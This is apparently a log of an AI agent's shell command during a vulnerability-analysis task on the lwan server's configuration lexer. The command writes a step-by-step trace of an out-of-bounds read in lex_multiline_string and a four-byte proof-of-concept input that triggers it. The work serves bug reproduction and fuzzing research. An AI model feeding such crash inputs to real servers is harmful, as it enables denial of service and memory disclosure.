message:
Command `cd /workspace/repo-vul/src-vul/lwan && grep -n 'lex_multiline_string\|backup(lexer);\|strncmp(lexer->pos, end, 3)' -n src/lib/lwan-config.c && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/candidate_trace.json')
trace=[
  {"step":1,"file":"src/bin/fuzz/config_fuzzer.cc","function":"LLVMFuzzerTestOneInput","line":43,"var":"data/size","code":"memcpy(static_data, data, size);","note":"Attacker-controlled input bytes are copied into the fuzzer buffer before parsing."},
  {"step":2,"file":"src/lib/lwan-config.c","function":"config_open_for_fuzzing","line":789,"var":"len","code":"return config_init_data(config, data, len - 1);","note":"The fuzzer hands the parser a bounded byte range from the copied input."},
  {"step":3,"file":"src/lib/lwan-config.c","function":"config_init_data","line":805,"var":"lexer.end","code":".end = (char *)data + len,","note":"The lexer end pointer is derived from attacker-controlled size and defines the boundary for subsequent scans."},
  {"step":4,"file":"src/lib/lwan-config.c","function":"lex_config","line":328,"var":"chr","code":"if (chr == '\'' && !strncmp(lexer->pos, "''", 2)) return lex_multiline_string;","note":"Three leading quotes dispatch the lexer into multiline-string mode."},
  {"step":5,"file":"src/lib/lwan-config.c","function":"lex_multiline_string","line":342,"var":"end","code":"char *end = (peek(lexer) == '"') ? "\"\"\"" : "'''";","note":"The lexer chooses a 3-byte terminator pattern based on the next attacker-controlled byte."},
  {"step":6,"file":"src/lib/lwan-config.c","function":"lex_multiline_string","line":349,"var":"lexer->pos","code":"if (!strncmp(lexer->pos, end, 3)) {","note":"Each loop iteration compares three bytes starting at lexer->pos, which can reach the exact end of the attacker-controlled buffer in an unterminated multiline string and read past it."}
]
p.write_text('[\n' + ',\n'.join(__import__('json').dumps(x) for x in trace) + '\n]')
print(p.read_text())
PY
python3 - <<'PY'
from pathlib import Path
Path('/workspace/poc.bin').write_bytes(b"'''x")
print('wrote poc 4 bytes')
PY` executed with exit code 0.
